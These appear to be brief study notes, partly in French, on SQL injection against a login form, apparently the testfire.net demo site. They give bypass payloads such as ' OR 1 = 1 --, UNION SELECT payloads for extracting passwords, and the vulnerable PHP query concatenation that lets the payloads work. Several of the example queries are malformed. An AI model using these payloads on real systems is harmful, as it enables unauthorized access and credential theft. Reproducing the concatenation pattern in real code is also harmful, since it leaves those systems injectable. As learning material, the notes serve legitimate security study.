http://testfire.net/login.jsp


login : admin' OR 1 = 1 --
password : a

INJECTION SQL 

FORMULAIRE => $login_saisi / $password_saisi

... 


```php
# login : toto
# password : titi

"SELECT * FROM user WHERE login ='toto' AND password = 'titi'" ; 


"SELECT * FROM user WHERE login ='" . $login_saisi .  "' AND password = '" . $password_saisi . "'" ;

# login : ' OR 1 = 1 --
# password : a

"SELECT * FROM user WHERE login ='" . $login_saisi .  "' AND password = '" . $password_saisi . "'" ;
"SELECT * FROM user WHERE login ='admin' OR 1 = 1 --' AND password = 'a'" ;

```


< https://129d2ea14358.ngrok-free.app>

```php
# login : ' OR 1 = 1 --

"SELECT * FROM user WHERE login =' OR 1 = 1 --  ;


# login : '' OR 1 = 1 --

"SELECT * FROM user WHERE login ='' OR 1 = 1 --  ;



# login : 1 OR 1=1 UNION SELECT * FROM users --


"SELECT id FROM user WHERE login ='' UNION SELECT password FROM user  ;


# login : 1 OR 1=1 UNION SELECT surname , password FROM users --

```